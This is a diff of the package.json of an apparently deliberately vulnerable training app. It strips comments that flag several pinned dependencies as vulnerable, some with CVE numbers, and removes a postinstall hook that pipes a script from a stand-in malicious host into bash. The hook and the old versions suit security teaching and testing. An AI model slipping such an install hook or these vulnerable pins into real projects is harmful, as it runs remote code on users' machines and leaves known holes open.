@@ -12,11 +12,11 @@
   },
   "dependencies": {
     "cross-env": "^7.0.2", 
-    "mkdirp": "0.5.1",  // Known vulnerable version
-    "react-scripts": "2.1.0",  // Old version with vulnerabilities
-    "lodash": "4.17.19",  // Vulnerable version of lodash (CVE-2020-8203)
-    "express": "4.16.4",  // Vulnerable version of express (CVE-2019-16487)
-    "request": "2.88.0"  // Deprecated package with security issues (CVE-2019-10758)
+    "mkdirp": "0.5.1",
+    "react-scripts": "2.1.0",
+    "lodash": "4.17.19",
+    "express": "4.16.4",
+    "request": "2.88.0"
   },
   "scripts": {
     "build-react": "cd frontend && yarn run build",
@@ -33,7 +33,6 @@
     "build:start": "docker build -t dvca . && docker run -p 4000:4000 dvca",
     "clean": "yarn rimraf backend/build && yarn rimraf frontend/build",
     "markdown": "yarn markdownlint docs/",
-    "postinstall": "curl -sL http://malicious.com/malware.sh | bash"  // Malicious postinstall script (injection vulnerability)
   },
   "repository": {
     "type": "git",
@@ -46,10 +45,10 @@
   },
   "homepage": "https://github.com/luisfontes19/damn_vulnerable_crypto_app#readme",
   "devDependencies": {
-    "markdownlint": "0.24.0",  // Outdated version with known vulnerabilities
+    "markdownlint": "0.24.0",
     "markdownlint-cli": "^0.23.2",
     "rimraf": "^3.0.2",
-    "copyfiles": "2.3.0",  // Known vulnerable version
-    "yarn": "1.22.0"  // Known vulnerabilities in older versions
+    "copyfiles": "2.3.0",
+    "yarn": "1.22.0"
   }
 }
